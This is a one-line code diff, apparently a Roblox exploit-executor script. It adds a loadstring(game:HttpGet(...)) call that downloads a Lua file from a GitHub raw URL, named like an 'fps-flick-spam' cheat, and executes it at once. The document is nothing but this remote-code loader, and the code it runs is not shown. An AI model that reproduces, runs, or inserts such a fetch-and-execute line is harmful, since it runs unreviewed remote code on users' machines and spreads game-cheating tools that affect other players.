@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/fps-flick-spam2-bw5pfyb1kkj0h1.lua"))()
